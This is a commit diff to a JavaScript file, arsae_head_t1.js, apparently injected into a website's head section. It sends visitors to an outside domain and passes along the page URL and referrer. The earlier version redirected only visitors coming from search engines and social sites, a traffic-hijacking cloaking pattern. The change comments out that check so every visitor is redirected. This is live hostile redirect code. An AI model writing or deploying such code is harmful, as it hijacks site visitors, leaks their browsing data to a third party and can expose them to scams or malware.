caa3a55ff606c53ab68a3a4b9bf7d0a7f6d00e4d
recognitionissue <tasralasir@gmail.com>
2026-03-06 10:58:10 +0700

    Update arsae_head_t1.js

--- arsae_head_t1.js
+++ arsae_head_t1.js
@@ -2,7 +2,7 @@
 var arsT1Bing = 'https://cloud.teknodrem.com';
 // var arsT1Google = 'https://bohkreh.com';
 
-if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
+// if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
-	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer)
-}
+window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
+// }
